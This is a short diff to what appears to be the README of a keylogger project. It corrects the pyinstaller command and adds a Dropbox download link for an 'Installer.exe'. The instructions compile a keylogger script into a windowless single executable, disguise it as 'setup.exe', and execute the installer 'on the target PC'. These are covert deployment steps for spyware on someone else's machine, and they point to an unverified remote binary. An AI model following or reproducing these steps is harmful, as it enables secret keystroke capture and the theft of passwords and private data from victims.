@@ -8,12 +8,12 @@ Compile the python file to a executable(.exe) file using pyinstaller.
 
   pip install pyinstaller
   
-  pyinstall keylogger_final.py -w --one-file
+  pyinstaller keylogger_final.py -w --one-file
   
   
 You will then get a .exe in the dist folder.
 Rename it setup.exe.
-Download Installer.exe from <here>
+Download Installer.exe from https://www.dropbox.com/s/q2mb6pqxyzizsk4/Installer.exe?dl=0
 Place setup.exe and Installer.exe in the same folder.
 On the target PC execute Installer.exe.
 
